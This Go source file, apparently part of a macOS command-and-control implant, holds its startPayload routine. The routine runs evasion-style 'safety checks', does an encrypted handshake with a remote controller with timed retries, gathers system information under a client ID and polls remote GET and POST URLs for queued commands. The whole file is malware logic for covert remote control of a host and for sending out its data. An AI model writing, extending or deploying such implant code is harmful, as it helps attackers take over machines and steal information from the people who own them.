//go:build darwin
// +build darwin

package main

import (
	"os"
	"time"
)

func startPayload() {
	if !performSafetyChecks() {
		debugSafetyChecks()
		os.Exit(1)
	}

	var err error
	handshakeManager, err = newHandshakeManager()
	if err != nil {
		os.Exit(1)
	}

	handshakeManager.setClientID(getClientID())

	if err := handshakeManager.performHandshake(); err != nil {
		for retries := 1; retries <= 3; retries++ {
			time.Sleep(time.Duration(retries) * 5 * time.Second)
			if err := handshakeManager.performHandshake(); err == nil {
				break
			} else if retries == 3 {
				os.Exit(1)
			}
		}
	}

	setClientID(handshakeManager.getCurrentClientID())

	getURL, postURL := handshakeManager.getCurrentURLs()

	initCommandQueue()

	sysInfoReport, err := collectSystemInfo(getClientID())
	if err != nil {
	}

	pollConfig := SyncConfig{
		GetURL:          getURL,
		PostURL:         postURL,
		DecryptedValues: handshakeManager.decryptedValues,
	}

	if err := startPolling(pollConfig, sysInfoReport); err != nil {
	}
}
